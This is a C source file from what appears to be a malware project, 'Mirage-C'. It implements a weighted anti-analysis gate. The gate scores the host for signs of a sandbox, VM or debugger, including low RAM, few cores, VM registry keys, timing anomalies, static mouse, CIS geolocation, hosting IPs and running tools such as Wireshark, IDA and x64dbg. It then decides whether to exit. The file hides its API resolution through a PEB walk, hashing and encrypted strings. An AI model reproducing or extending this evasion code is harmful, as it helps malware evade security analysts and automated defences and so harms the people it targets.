/*
 * anti_analysis.c — Weighted scoring gate for anti-analysis for Mirage-C
 *
 * Direct translation of Zig src/evasion/anti_analysis.zig.
 * Aggregates all evasion checks into a weighted score.
 */

#ifdef TEST_SCORING_STANDALONE
/* Standalone test mode: expose pure scoring helpers only */
#include <windows.h>
#include "anti_analysis.h"
#include "config.h"
#include <wchar.h>
#include <wctype.h>

wchar_t tolower_w(wchar_t c) {
    if (c >= L'A' && c <= L'Z') return c + 32;
    return c;
}

int wcsicontains(const wchar_t *haystack, const wchar_t *needle) {
    size_t nlen = 0;
    for (const wchar_t *q = needle; *q; q++) nlen++;
    if (nlen == 0) return 0;
    for (const wchar_t *p = haystack; *p; p++) {
        size_t i = 0;
        while (i < nlen && tolower_w(p[i]) == tolower_w(needle[i])) i++;
        if (i == nlen) return 1;
    }
    return 0;
}

int mirage_anti_analysis_should_exit(mirage_analysis_result result) {
    return result.score >= EVASION_SCORE_THRESHOLD ? 1 : 0;
}

#else /* Normal build */

#include "anti_analysis.h"
#include "evasion.h"
#include "detection.h"
#include <string.h>
#include "engine.h"
#include "config.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"
#ifdef ZIALFI_DEBUG
#include <stdio.h>  /* L8: only needed when dbg_printf expands to printf */
#endif
#include <wchar.h>
#include <wctype.h>
#include <tlhelp32.h>

#ifdef ENABLE_ANTI_ANALYSIS

/* Sandbox process names: enc_strings.h (restored, key-consistent)
 * arrays — the previous local copies used a stale key pipeline and
 * decrypted to garbage. */

/* Table of encrypted process names and their lengths */
typedef struct {
    const uint8_t *enc;
    size_t         len;
} proc_entry_t;

static const proc_entry_t sandbox_procs[] = {
    { enc_proc_procmon,        ENC_PROC_PROCMON_LEN },
    { enc_proc_wireshark,      ENC_PROC_WIRESHARK_LEN },
    { enc_proc_ollydbg,        ENC_PROC_OLLYDBG_LEN },
    { enc_proc_ida,            ENC_PROC_IDA_LEN },
    { enc_proc_ida64,          ENC_PROC_IDA64_LEN },
    { enc_proc_x64dbg,         ENC_PROC_X64DBG_LEN },
    { enc_proc_x32dbg,         ENC_PROC_X32DBG_LEN },
    { enc_proc_fiddler,        ENC_PROC_FIDDLER_LEN },
    { enc_proc_httpanalyzer,   ENC_PROC_HTTPANALYZER_LEN },
    { enc_proc_procexp,        ENC_PROC_PROCEXP_LEN },
    { enc_proc_processhacker,  ENC_PROC_PROCESSHACKER_LEN },
    { enc_proc_tcpview,        ENC_PROC_TCPVIEW_LEN },
    { enc_proc_autoruns,       ENC_PROC_AUTORUNS_LEN },
    { enc_proc_vmtoolsd,       ENC_PROC_VMTOOLSD_LEN },
    { enc_proc_vmwaretray,     ENC_PROC_VMWARETRAY_LEN },
    { enc_proc_vboxservice,    ENC_PROC_VBOXSERVICE_LEN },
};
#define SANDBOX_PROC_COUNT (sizeof(sandbox_procs) / sizeof(sandbox_procs[0]))

/* ── Case-insensitive wide-string substring match ─────────── */

static wchar_t tolower_w(wchar_t c) {
    if (c >= L'A' && c <= L'Z') return c + 32;
    return c;
}

static int wcsicontains(const wchar_t *haystack, const wchar_t *needle) {
    size_t nlen = 0;
    for (const wchar_t *q = needle; *q; q++) nlen++;
    if (nlen == 0) return 0;
    for (const wchar_t *p = haystack; *p; p++) {
        size_t i = 0;
        while (i < nlen && tolower_w(p[i]) == tolower_w(needle[i])) i++;
        if (i == nlen) return 1;
    }
    return 0;
}

/* ── check_sandbox_processes ──────────────────────────────── */

int check_sandbox_processes(void) {
    /* Resolve kernel32.dll via PEB-walk */
    char dll[32];
    enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return -1;

    /* Resolve CreateToolhelp32Snapshot, Process32FirstW, Process32NextW */
    char fn[32];
    enc_decrypt(enc_CreateToolhelp32Snapshot, ENC_CREATETOOLHELP32SNAPSHOT_LEN, fn);
    typedef HANDLE (WINAPI *pCreateToolhelp32Snapshot)(DWORD, DWORD);
    pCreateToolhelp32Snapshot pSnapshot =
        (pCreateToolhelp32Snapshot)mirage_get_function_by_hash(
            k32, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_Process32FirstW, ENC_PROCESS32FIRSTW_LEN, fn);
    typedef BOOL (WINAPI *pProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
    pProcess32FirstW pFirst =
        (pProcess32FirstW)mirage_get_function_by_hash(
            k32, mirage_encrypted_hash_func(fn));

    enc_decrypt(enc_Process32NextW, ENC_PROCESS32NEXTW_LEN, fn);
    typedef BOOL (WINAPI *pProcess32NextW)(HANDLE, LPPROCESSENTRY32W);
    pProcess32NextW pNext =
        (pProcess32NextW)mirage_get_function_by_hash(
            k32, mirage_encrypted_hash_func(fn));

    if (!pSnapshot || !pFirst || !pNext) return -1;

    /* Create process snapshot */
    HANDLE snap = pSnapshot(0x00000002 /* TH32CS_SNAPPROCESS */, 0);
    if (snap == INVALID_HANDLE_VALUE) return -1;

    /* Walk processes and compare against sandbox tool names */
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    int found = 0;
    if (pFirst(snap, &pe)) {
        do {
            /* Decrypt each sandbox process name and compare */
            for (size_t i = 0; i < SANDBOX_PROC_COUNT; i++) {
                char narrow[32];
                enc_decrypt(sandbox_procs[i].enc, sandbox_procs[i].len, narrow);

                /* Convert narrow to wide for comparison */
                wchar_t wneedle[32];
                for (size_t j = 0; j < sandbox_procs[i].len; j++)
                    wneedle[j] = (wchar_t)narrow[j];
                wneedle[sandbox_procs[i].len] = L'\0';

                if (wcsicontains(pe.szExeFile, wneedle)) {
                    found = 1;
                    break;
                }
            }
        } while (!found && pNext(snap, &pe));
    }

    /* Close handle via PEB-walk */
    typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
    enc_decrypt(enc_CloseHandle, ENC_CLOSEHANDLE_LEN, fn);
    pCloseHandle pClose = (pCloseHandle)mirage_get_function_by_hash(
        k32, mirage_encrypted_hash_func(fn));
    if (pClose) pClose(snap);

    return found;
}

/* ── Run all checks and compute score ────────────────────── */

mirage_analysis_result mirage_anti_analysis_run(void) {
    mirage_analysis_result result;
    memset(&result, 0, sizeof(result));

    /* RAM check: +20 if low, +10 if query failed */
    uint64_t ram = mirage_get_total_physical_ram();
    if (ram != 0) {
        if (ram < VM_MIN_RAM) {
            result.score += 20;
            result.flags.ram_low = 1;
        }
    } else {
        result.score += 10;
    }

    /* CPU core count: +20 if few, +10 if query failed */
    uint8_t cores = mirage_get_cpu_core_count();
    if (cores != 0) {
        if (cores < VM_MIN_CPU_CORES) {
            result.score += 20;
            result.flags.cpu_few = 1;
        }
    } else {
        result.score += 10;
    }

    /* Registry VM indicators: +25 */
    if (mirage_check_registry_vm_indicators()) {
        result.score += 25;
        result.flags.vm_registry = 1;
    }

    /* Timing anomaly: +20 */
    if (mirage_check_timing_anomaly()) {
        result.score += 20;
        result.flags.timing_anomaly = 1;
    }

    /* Debugger: +15 */
    if (mirage_check_debugger()) {
        result.score += 15;
        result.flags.debugger = 1;
    }

    /* Screen resolution: +10 if small */
    mirage_screen_res screen = mirage_check_screen_resolution();
    if (screen.w != 0 || screen.h != 0) {
        if (screen.w < VM_MIN_SCREEN_WIDTH || screen.h < VM_MIN_SCREEN_HEIGHT) {
            result.score += 10;
            result.flags.small_screen = 1;
        }
    }

    /* Disk size: +15 if small (<60 GB), +5 if query failed */
    int disk = mirage_check_disk_size();
    if (disk == 1) {
        result.score += 15;
        result.flags.disk_small = 1;
    } else if (disk == -1) {
        result.score += 5;
    }

    /* Uptime: +15 if low (<30 min), +5 if query failed */
    int uptime = mirage_check_uptime();
    if (uptime == 1) {
        result.score += 15;
        result.flags.uptime_low = 1;
    } else if (uptime == -1) {
        result.score += 5;
    }

    /* Mouse movement: +10 if static, +5 if query failed */
    int mouse = mirage_check_mouse_movement();
    if (mouse == 1) {
        result.score += 10;
        result.flags.mouse_static = 1;
    } else if (mouse == -1) {
        result.score += 5;
    }

    /* Geo block: +20 if >=2 CIS indicators */
    mirage_geo_result geo = mirage_check_geo_block();
    if (geo.matched >= 2) {
        result.score += 20;
        result.flags.geo_cis = 1;
    }

    /* Hosting IP: +25 if hosting, +5 if indeterminate */
    int hosting = mirage_check_hosting_ip();
    if (hosting == 1) {
        result.score += 25;
        result.flags.hosting_ip = 1;
    } else if (hosting == -1) {
        result.score += 5;
    }

    /* Sandbox/analysis processes: +30 if detected */
    int sandbox = check_sandbox_processes();
    if (sandbox == 1) {
        result.score += 30;
        result.flags.sandbox_proc = 1;
    }

    return result;
}

/* ── Should exit? ────────────────────────────────────────── */

int mirage_anti_analysis_should_exit(mirage_analysis_result result) {
    return result.score >= EVASION_SCORE_THRESHOLD ? 1 : 0;
}

/* ── Print result ────────────────────────────────────────── */

void mirage_anti_analysis_print(mirage_analysis_result result) {
    dbg_printf("  Score: %u/%u\n", result.score, EVASION_SCORE_THRESHOLD);

    if (result.flags.ram_low)         dbg_printf("    - ram_low detected\n");
    if (result.flags.cpu_few)         dbg_printf("    - cpu_few detected\n");
    if (result.flags.vm_registry)     dbg_printf("    - vm_registry detected\n");
    if (result.flags.timing_anomaly)  dbg_printf("    - timing_anomaly detected\n");
    if (result.flags.debugger)        dbg_printf("    - debugger detected\n");
    if (result.flags.small_screen)    dbg_printf("    - small_screen detected\n");
    if (result.flags.process_list)    dbg_printf("    - process_list detected\n");
    if (result.flags.disk_small)      dbg_printf("    - disk_small detected\n");
    if (result.flags.uptime_low)      dbg_printf("    - uptime_low detected\n");
    if (result.flags.mouse_static)    dbg_printf("    - mouse_static detected\n");
    if (result.flags.geo_cis)         dbg_printf("    - geo_cis detected\n");
    if (result.flags.hosting_ip)      dbg_printf("    - hosting_ip detected\n");
    if (result.flags.sandbox_proc)    dbg_printf("    - sandbox_proc detected\n");
}

#endif /* ENABLE_ANTI_ANALYSIS */
#endif /* TEST_SCORING_STANDALONE */
